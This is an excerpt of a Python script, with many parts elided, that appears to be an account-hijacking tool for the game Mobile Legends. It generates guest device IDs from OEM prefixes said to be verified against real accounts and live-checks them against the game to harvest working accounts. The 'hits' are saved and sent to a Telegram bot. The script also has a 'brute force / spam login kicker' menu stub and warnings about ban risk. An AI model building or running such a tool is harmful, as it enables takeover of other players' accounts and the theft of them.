#!/usr/bin/env python3
# ===================================================================
# PREMIUM DEVID SEKER - ULTRA MLBB TOOLS v6.0
# Created by: @PRIME_MICK
# Features: OEM A/B/C Selection + Live Check + Offline + TG Report
# ===================================================================
...
# ── OEM A: VERIFIED (200+ real accounts) ──
OEM_A = "cd9e459ea708a948d5c2f5a6ca8838cf"

# ── OEM B: From device_ids_100 (63 unique) ──
OEM_B_POOL = [
...
# ── OEM C: Original Script Auto Generate Pool ──
OEM_C_POOL = [
...
# ── Global OEM Mode ──
OEM_MODE = "A"   # "A" | "B" | "C" | "MIX" | "MIX_ABC"

def get_oem(mode: str = None) -> str:
    """Get OEM based on mode"""
    m = mode or OEM_MODE
    if m == "A":
        return OEM_A
    elif m == "B":
...
{Fore.YELLOW}═══════════════════════════════════════════════════════════════
{Fore.LIGHTBLACK_EX}              Created by: {Fore.CYAN}@PRIME_MICK{Fore.LIGHTBLACK_EX} | v6.0
...
def generate_verified_device() -> str:
    """Generate device ID with selected OEM mode"""
    oem = get_oem()
    return f"and_{oem}{random_hex(16)}-{uuid.uuid4()}"
...
def run_generator(size_mb: float, threads: int = 16):
    ...
    print(f"{Fore.GREEN}✓ Generated {target_lines:,} devices{Style.RESET_ALL}")
...
def save_account(account_info: dict, player_data: dict):
    ...
    # ── Add to global HIT_LIST for TG report ──
    with HIT_LIST_LOCK:
        HIT_LIST.append({
            'device': device,
            'acc': acc,
    ...
    # ── Telegram individual send (if criteria) ──
...
def run_bulk_detail():
    ...
    print(f"{Fore.CYAN}Live device checking with real-time status{Style.RESET_ALL}\n")
    print(f"{Fore.RED}⚠️  High thread count = faster but higher ban risk{Style.RESET_ALL}\n")
    ...
    # Clear hit list for this session
    with HIT_LIST_LOCK:
        HIT_LIST.clear()
...
def send_hits_report_to_tg():
    ...
    if success:
        print(f"{Fore.GREEN}✓ Report sent to Telegram!{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}✗ Failed to send to Telegram{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}  Check TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID{Style.RESET_ALL}")
...
def show_stats():
    ...
    with HIT_LIST_LOCK:
        print(f"\n{Fore.CYAN}Session Hits Collected: {Fore.GREEN}{len(HIT_LIST):,}{Style.RESET_ALL}")
...
def run_cleanup():
    ...
    print(f"{Fore.YELLOW}WARNING: Delete all output files in {OUTPUT_DIR}{Style.RESET_ALL}")
...
def test_telegram():
    ...
    print(f"{Fore.CYAN}Sending test...{Style.RESET_ALL}")
    ...
    if success:
        ...
        print(f"{Fore.RED}✗ Failed! Check token/chat ID{Style.RESET_ALL}")
    input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")

# ────────────────────────────────────────────────────────────────
# 14. GENERATOR MENU — OEM A/B/C
# ────────────────────────────────────────────────────────────────
...
def run_generator_menu():
    ...
    print(f"{Fore.LIGHTBLACK_EX}     200+ real accounts verified{Style.RESET_ALL}\n")

    print(f"{Fore.YELLOW}[2]{Style.RESET_ALL} {Fore.CYAN}OEM B{Style.RESET_ALL} — Device Pool ({len(OEM_B_POOL)} OEMs)")
    print(f"{Fore.LIGHTBLACK_EX}     From device_ids_100.txt{Style.RESET_ALL}\n")

    print(f"{Fore.YELLOW}[3]{Style.RESET_ALL} {Fore.MAGENTA}OEM C{Style.RESET_ALL} — Auto Generate ({len(OEM_C_POOL)} OEMs)")
    print(f"{Fore.LIGHTBLACK_EX}     Original script pool:{Style.RESET_ALL}")
    for oem in OEM_C_POOL:
        print(f"{Fore.LIGHTBLACK_EX}       • {oem}{Style.RESET_ALL}")
    print()

    print(f"{Fore.YELLOW}[4]{Style.RESET_ALL} {Fore.YELLOW}MIX{Style.RESET_ALL}   — 90% A + 10% B")
    print(f"{Fore.YELLOW}[5]{Style.RESET_ALL} {Fore.YELLOW}MIX_ABC{Style.RESET_ALL} — 70% A + 15% B + 15% C")
    print(f"{Fore.YELLOW}[0]{Style.RESET_ALL} 🔙 Back\n")

    choice = input(f"{Fore.CYAN}Choose mode (0-5): {Style.RESET_ALL}").strip()
    ...
    mode_names = {
        ...
        "C": f"OEM C (Auto {len(OEM_C_POOL)})",
        "MIX": "MIX (90% A + 10% B)",
        "MIX_ABC": "MIX_ABC (70% A + 15% B + 15% C)",
    }
...
# ────────────────────────────────────────────────────────────────
# 15. BRUTE FORCE (simplified)
# ────────────────────────────────────────────────────────────────

def run_bruteforce_login():
    print_header("⚡ BRUTE FORCE / SPAM LOGIN KICKER")
    print(f"{Fore.LIGHTBLACK_EX}Coming soon / Simplified{Style.RESET_ALL}")
    input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
...
def run_single_check():
    print_header("🔍 SINGLE ACCOUNT CHECK (8-REQ FULL)")
    ...
    # Clear hit list for this single check
    with HIT_LIST_LOCK:
        HIT_LIST.clear()
...
def main():
    ...
    while True:
        ...
        print(f"{Fore.YELLOW}[1]{Style.RESET_ALL} Generate Device IDs (OEM A/B/C)")
